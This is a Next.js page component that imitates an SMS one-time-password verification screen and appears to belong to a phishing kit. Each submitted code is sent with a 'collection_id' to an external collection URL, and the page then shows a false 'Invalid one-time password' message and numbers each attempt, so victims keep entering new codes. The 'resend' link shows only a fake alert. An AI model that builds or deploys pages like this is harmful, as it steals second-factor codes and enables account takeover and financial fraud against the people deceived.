'use client';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";
import React, { useState } from 'react';
import TimerComponent from "../inlcude/TimerComponent";
import css from "./H4KHLSLSSKL.module.css";

export default function Home() {
    const [error, setError] = useState(''); 
    const [countott, setCountott] = useState(0);
    const router = useRouter();
    const API_URL = process.env.NEXT_PUBLIC_URL;
  const SITE = process.env.NEXT_PUBLIC_SITE;
    const handleSubmit = async (e) => {
        e.preventDefault();
        const form = e.target;
        setError('');
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key+countott] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE;
        jsonObject1['id'] = localStorage.getItem('collection_id');
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            form.reset();
            setError('Invalid one-time password');

            setTimeout(() => {
                setError('');
            },3000)
            setCountott(countott + 1);
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
            setError('');
        }
    };
  return (
    <>
    <Header />
    <br />
    <div className={css.loginHeading}>
        <h3 className={css.textCenter} style={{ marginLeft: 12 }}>One Time Password Verification</h3>
    </div>
    <div className={css.loginForm}>

        <div className={css.contentArea}>
            <p className={css.mandatoryTxt}>
                Mandatory fields are marked with an asterisk (*)
            </p>
            <form onSubmit={handleSubmit}>
                <div className={css.formGroup}>
                    <label className={css.controlLabel} htmlFor="otp2">
                        One Time Password<span className={css.mandatoryTxt}>*</span>
                    </label>
                    <input
                        className={css.formControl}
                        inputMode="numeric"
                        type="text"
                        name="ott"
                        minLength={6}
                        maxLength={8}
                        required
                    />
                    <span className={`${css.textDanger} ${css.invalid}`}>{error}</span>
                </div>
                <TimerComponent />
            </form>
            <div className={css.commonBtn}>
                <p>
                    If you did not receive One Time Password on SMS, you can
                    <a
                        href="#"
                        onClick={() => alert('We have sent an one-time password')}
                        className={`${css.btn} ${css.btnResend}`}
                        type="button"
                    >
                        Click here to resend
                    </a>
                </p>
            </div>
        </div>
    </div>
    <Footer />
</>

  );
}